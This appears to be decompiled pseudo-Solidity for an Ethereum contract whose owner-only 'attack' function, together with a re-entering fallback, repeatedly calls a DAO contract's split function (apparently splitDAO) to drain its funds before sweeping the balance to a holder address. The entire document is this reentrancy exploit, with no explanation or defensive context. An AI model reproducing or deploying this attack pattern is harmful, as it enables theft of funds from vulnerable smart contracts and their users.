contract main {


// =======================  Init code  ======================


uint256 stor0;

function _fallback() payable {
    stor0 = msg.sender or Mask(96, 160, stor0)
    return code.data[36 len 1495]
}



// =====================  Runtime code  =====================


address owner;
uint256 stor0;
address stor1;
uint256 stor1;
address stor2;
uint256 stor2;
uint256 stor3;
uint256 stor4;
address stor5;
uint256 stor5;
uint256 stor6;

function owner() payable {
    return address(owner)
}

function setDao(address arg1) payable {
    if address(owner) == msg.sender:
        uint256(stor1) = arg1 or Mask(96, 160, uint256(stor1))
}

function setHolder(address arg1) payable {
    if address(owner) == msg.sender:
        uint256(stor2) = arg1 or Mask(96, 160, uint256(stor2))
}

function changeOwner(address arg1) payable {
    if address(owner) == msg.sender:
        uint256(stor0) = arg1 or Mask(96, 160, uint256(stor0))
}

function vote(uint256 arg1) payable {
    if address(owner) == msg.sender:
        call address(stor1).0xc9d27afe with:
             gas gas_remaining - 25050 wei
            args arg1, 1
        require ext_call.success
}

function transfer(address arg1, address arg2, uint256 arg3) payable {
    if address(owner) == msg.sender:
        call arg1.0xa9059cbb with:
             gas gas_remaining - 25050 wei
            args address(arg2), arg3
        require ext_call.success
}

function _fallback() payable {
    if stor4 <= 0:
        call address(stor1).0x70a08231 with:
             gas gas_remaining - 25050 wei
            args this.address
        require ext_call.success
        call address(stor1).0xa9059cbb with:
             gas gas_remaining - 25050 wei
            args address(stor2), ext_call.return_data[0]
    else:
        stor4--
        call address(stor1).0x82661dc4 with:
             gas gas_remaining - 25050 wei
            args stor3, address(stor5)
        require ext_call.success
    return 1
}

function call(address arg1, uint256 arg2, bytes arg3) payable {
    mem[128 len arg3.length] = arg3[all]
    if msg.sender == address(owner):
        mem[ceil32(arg3.length) + 128 len arg3.length] = arg3[all]
        if not arg3.length % 32:
            call arg1 with:
               value arg2 wei
                 gas gas_remaining - 34050 wei
                args arg3[all]
        else:
            mem[floor32(arg3.length) + ceil32(arg3.length) + 128] = mem[floor32(arg3.length) + ceil32(arg3.length) + -(arg3.length % 32) + 160 len arg3.length % 32]
            call arg1.mem[ceil32(arg3.length) + 128 len 4] with:
               value arg2 wei
                 gas gas_remaining - 34050 wei
                args mem[ceil32(arg3.length) + 132 len floor32(arg3.length) + 28]
}

function attack(uint256 arg1, uint256 arg2) payable {
    if address(owner) == msg.sender:
        call address(stor1).0x70a08231 with:
             gas gas_remaining - 25050 wei
            args this.address
        require ext_call.success
        stor6 = ext_call.return_data[0]
        call address(stor2).0x1a695230 with:
             gas gas_remaining - 25050 wei
            args address(stor1)
        stor4 = arg2
        stor3 = arg1
        call address(stor1).proposals(uint256 rg1) with:
             gas gas_remaining - 25050 wei
            args arg1
        uint256(stor5) = ext_call.return_data[0] or Mask(96, 160, uint256(stor5))
        call address(stor1).0x82661dc4 with:
             gas gas_remaining - 25050 wei
            args stor3, address(ext_call.return_data[0])
}



}
